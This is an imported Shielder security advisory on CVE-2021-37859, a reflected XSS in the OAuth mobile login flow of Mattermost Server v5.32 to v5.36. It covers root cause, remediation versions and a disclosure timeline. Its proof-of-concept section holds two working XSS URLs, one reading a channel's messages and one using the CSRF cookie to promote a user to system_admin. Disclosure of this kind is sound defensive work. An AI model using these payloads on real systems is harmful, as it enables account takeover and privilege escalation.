---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-07-26_mattermost-server-v532-v536-reflected-xss-in-oauth-flow.md
original_filename: 2021-07-26_mattermost-server-v532-v536-reflected-xss-in-oauth-flow.md
title: Mattermost Server v5.32 > v5.36 Reflected XSS in OAuth flow
category: documents
detected_topics:
- xss
- oauth
- command-injection
- otp
- csrf
- mobile-security
tags:
- imported
- documents
- xss
- oauth
- command-injection
- otp
- csrf
- mobile-security
language: en
raw_sha256: a2dca4a3bf97111542311310f525893981bca25546f067c7a48a220d942fd749
text_sha256: 88a0d9c8aff0a6d7a706e507278997db4bc28f09f684a74d235a51c5eef5bbcf
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: false
---

# Mattermost Server v5.32 > v5.36 Reflected XSS in OAuth flow

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-07-26_mattermost-server-v532-v536-reflected-xss-in-oauth-flow.md
- Source Type: markdown
- Detected Topics: xss, oauth, command-injection, otp, csrf, mobile-security
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: False
- Raw SHA256: `a2dca4a3bf97111542311310f525893981bca25546f067c7a48a220d942fd749`
- Text SHA256: `88a0d9c8aff0a6d7a706e507278997db4bc28f09f684a74d235a51c5eef5bbcf`


## Content

---
title: "Mattermost Server v5.32 > v5.36 Reflected XSS in OAuth flow"
page_title: "Shielder - Mattermost server v5.32 > v5.36 Reflected XSS in OAuth flow"
url: "https://www.shielder.it/advisories/mattermost-server-reflected-xss-oauth/"
final_url: "https://www.shielder.com/advisories/mattermost-server-reflected-xss-oauth/"
authors: ["zi0Black (@zi0Black)"]
programs: ["Mattermost"]
bugs: ["Reflected XSS", "OAuth"]
bounty: "900"
publication_date: "2021-07-26"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3478
---

[![shielder logo homepage](https://www.shielder.com/img/logoshielder.svg)](https://www.shielder.com/ "homepage") __

  * [Home](https://www.shielder.com/ "Home")
  * [Company](https://www.shielder.com/company "Company")
  * [Services](https://www.shielder.com/services "Services")
  * [Advisories](https://www.shielder.com/advisories "Advisories")
  * [Blog](https://www.shielder.com/blog "Blog")
  * [Careers](https://www.shielder.com/careers "Careers")
  * [Contacts](https://www.shielder.com/contacts "Contacts")
  * ENG

[ENG](https://www.shielder.com/advisories/mattermost-server-reflected-xss-oauth/ "ENG") [ITA](https://www.shielder.com/it/advisories/mattermost-server-reflected-xss-oauth/ "ITA")

# Mattermost Server v5.32 > v5.36 Reflected XSS in OAuth flow

## Summary

The OAuth flow implemented in Mattermost server v5.32 > v5.36 is affected by a reflected XSS. An unauthenticated attacker might gain access to the victim’s session.

## Product Description (from vendor)

“Mattermost is an open source, self-hosted Slack-alternative. As an alternative to proprietary SaaS messaging, Mattermost brings all your team communication into one place, making it searchable and accessible anywhere.”

For more information visit <https://mattermost.org/about/>.

## CVE(s)

  * [CVE-2021-37859](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37859) (MMSA-2021-0055)

## Details

### Root Cause Analysis

The application fails to sanitize an HTTP query parameter before reflecting it within the HTML response during the OAuth flow.
  
  
  280
  281
  282
  283
  284
  285
  286
  287
  288
  289
  290
  291
  292
  293
  294
  

| 
  
  
  if props != nil {
  action = props["action"]
  isMobile = action == model.OAUTH_ACTION_MOBILE
  if val, ok := props["redirect_to"]; ok {
  [1]  redirectURL = val
  hasRedirectURL = redirectURL != ""
  }
  }
  renderError := func(err *model.AppError) {
  if isMobile && hasRedirectURL {
  [2]  utils.RenderMobileError(c.App.Config(), w, err, redirectURL)
  } else {
  utils.RenderWebAppError(c.App.Config(), w, r, err, c.App.AsymmetricSigningKey())
  }
  }
  
  
---|---  
  
The file “/web/oauth.go” (<https://github.com/mattermost/mattermost-server/blob/master/web/oauth.go>) contains the function “completeOAuth” which on line 284 values the variable “redirectURL” with the parameter “redirect_to” [1] of the query string of the HTTP GET request. At line 291 the function “utils.RenderMobileError” is called, with “redirectURL” [2] as parameter.
  
  
  103
  104
  105
  106
  107
  108
  109
  110
  111
  112
  113
  114
  115
  

| 
  
  
  func RenderMobileError(config *model.Config, w http.ResponseWriter, err *model.AppError, redirectURL string) {
  RenderMobileMessage(w, `
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" style="width: 64px; height: 64px; fill: #ccc">
  <!-- Font Awesome Free 5.15.3 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) -->
  <path d="M569.517 440.013C587.975 472.007 564.806 512 527.94 512H48.054c-36.937 0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154 0l239.94 416.028zM288 354c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"/>
  </svg>
  <h2> `+i18n.T("error")+` </h2>
  <p> `+err.Message+` </p>
  [1]  <a href="`+redirectURL+`">
  `+i18n.T("api.back_to_app", map[string]interface{}{"SiteName": config.TeamSettings.SiteName})+`
  </a>
  `)
  }
  
  
---|---  
  
The function “RenderMobileError” is contained within the file [utils/api.go](https://github.com/mattermost/mattermost-server/blob/master/utils/api.go) at line 103, and the fourth argument of this function is “redirectURL”. At line 104 the “RenderMobileMessage” function is called and at line 111 the variable “redirectURL” is concatenated (without any modification) with another string argument of the “RenderMobileMessage” function [1].
  
  
  157
  158
  159
  160
  161
  162
  163
  164
  165
  166
  

| 
  
  
  [...]
  </head>
  <body>
  <!-- mobile app message -->
  <div class="message-container">
  [1]  `+message+`
  </div>
  </body>
  </html>
  `)
  
  
---|---  
  
Inside the “RenderMobileMessage” function (declared at line 117 of utils/api.go) “fmt.Fprintln” is called to print the HTTP response and the HTML page is dynamically built concatenating the “message” variable [1] (second argument of the function).

Since the HTTP GET request parameter “redirect_to” is never sanitized and is appended to the HTML page, it is possible to trigger a reflected XSS.

### Proof of Concept

#### PoC 1 (regular user)

In this PoC, the attacker reads the latest messages in a given channel. The output is shown as the content of an `alert()` but could be sent to an attacker-controlled server in a real-world scenario.

  1. Visit the following URL by replacing `<mattermost_url>` target MatterMost instance domain / IP, `<user_id>` with the victim’s user_id, and `<channel_id>` with the channel_id you want to read messages of: `http://<mattermost_url>/oauth/shielder/mobile_login?redirect_to=%22%3E%3Cimg%20src=%22%22%20onerror="var xhr = new XMLHttpRequest()%3bxhr.open('GET', '/api/v4/users/<user_id>/channels/<channel_id>/posts/unread?limit_after=30', true)%3bxhr.withCredentials = true%3bxhr.send(null)%3balert(xhr.responseText)%3b"%3E`
  2. Notice the pop-up containing the latest message of the chosen channel

#### PoC 2 (admin)

In this PoC, the attacker sends to an administrator the malicious link, which, when visited, would change the role of the attacker’s user to `system_admin`.

  1. Visit the following URL with an admin by replacing `<mattermost_url>` target MatterMost instance domain / IP and `<user_id>` with the user you want to promote to `system_admin`: `http://<mattermost_url>/oauth/shielder/mobile_login?redirect_to=%22%3E%3Cimg%20src=%22%22%20onerror="var xhr = new XMLHttpRequest()%3bxhr.open('PUT', '/api/v4/users/<user_id>/roles', true)%3bxhr.withCredentials = true%3bxhr.setRequestHeader('X-CSRF-Token', document.cookie.match(new RegExp('(^| )'%2b'MMCSRF'%2b'=([^%3b]%2b)'))[2])%3bxhr.send(JSON.stringify('{\'roles\':\'system_user system_admin\'}'))%3b"%3E`
  2. Login with the account whose `user_id` has been used in step 1
  3. Notice that the user is now an administrator (this could be verified by visiting `/admin_console/user_management/users`)

### Impact

An unauthenticated attacker might gain access to a privileged user session.

### Remediation

Upgrade Mattermost Server to version v5.34.5, v5.35.4, v5.36.1, and v5.37.0 or higher.

## Disclosure Timeline

This report was subject to Shielder’s [disclosure policy](/disclosure-policy):

  * 03/06/2021: The vulnerability is reported to Mattermost via their public bug bounty program on [Hackerone](https://hackerone.com/mattermost)
  * 07/06/2021:
  * Mattermost acknowledges issue
  * Mattermost requires additional PoC to prove the impact
  * Shielder and Mattermost agree on the impact of the vulnerability
  * 16/06/2021:
  * Shielder reports a bypass for the fix (v5.36)
  * Mattermost acknowledges bypass
  * Mattermost rewards Shielder, including a bonus for the bypass
  * 21/06/2021: Mattermost releases v5.36.1 with a patch
  * 26/07/2021: Shielder’s advisory is made public

## Credits

`[zi0Black](https://twitter.com/zi0Black)` of Shielder

This advisory was first published on https://www.shielder.com/advisories/mattermost-server-reflected-xss-oauth/

__[Advisory](/types/advisory)

Date

26 July 2021

Info

Shielder S.p.A.

P.I. 11435310013

REA TO - 1213132

Registered Capital: 81.000,00 €

[Via Palestro, 1/C  
10064 Pinerolo (TO) Italy](https://www.google.it/maps/place/Shielder/@44.8833849,7.3303863,17z/data=!3m1!4b1!4m5!3m4!1s0x4788250440849fa5:0x74cf10f2092abc85!8m2!3d44.8833849!4d7.332575 "corporate headquarters")

![ISO27001](/img/iso27001.png)

![ISO9001](/img/iso9001.png)

Contacts

[info@shielder.com](mailto:info@shielder.com "email Shielder")

Landline: [(+39) 0121 - 39 36 42](tel:+390121393642 "Landline")

Commercial: [(+39) 345 - 57 18 634](tel:+393455718634 "Commercial")

Technical: [(+39) 393 - 16 66 814](tel:+393931666814 "Technical")

[ __](https://twitter.com/ShielderSec "Shielder Twitter profile")[__](https://bsky.app/profile/shielder.com "Shielder Bluesky profile")[__](https://infosec.exchange/@Shielder "Shielder Mastodon profile")[__](https://www.linkedin.com/company/shielder "Shielder LinkedIn profile")[__](https://github.com/shieldersec "Shielder Github profile")

Sitemap

[Home](https://www.shielder.com/ "Home")

[Company](https://www.shielder.com/company "Company")

[Services](https://www.shielder.com/services "Services")

[Advisories](https://www.shielder.com/advisories "Advisories")

[Blog](https://www.shielder.com/blog "Blog")

[Careers](https://www.shielder.com/careers "Careers")

[Contacts](https://www.shielder.com/contacts "Contacts")

Copyright © Shielder 2014 - 2026 [Disclosure policy](/disclosure-policy "Disclosure Policy") [Privacy policy](/privacy-policy "Privacy Policy")
